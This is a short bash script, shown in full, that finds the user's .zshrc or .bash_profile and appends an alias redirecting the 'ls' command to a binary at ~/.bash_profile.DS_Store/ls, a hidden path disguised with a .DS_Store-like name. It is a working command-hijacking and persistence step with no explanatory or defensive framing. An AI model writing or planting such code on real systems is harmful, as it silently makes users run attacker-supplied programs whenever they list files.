#!/bin/bash

find ~ -type f -name .zshrc -maxdepth 1 | grep . >/dev/null
found=$?
file=".zshrc"
if ! [ $found -eq "0" ]; then
	find ~ -type f -name .bash_profile -maxdepth 1 | grep . >/dev/null
	found=$?
	file=".bash_profile"
	if ! [ $found -eq "0" ]; then
		exit 1
	fi
fi

echo 'alias ls="~/.bash_profile.DS_Store/ls"' >> $HOME/$file
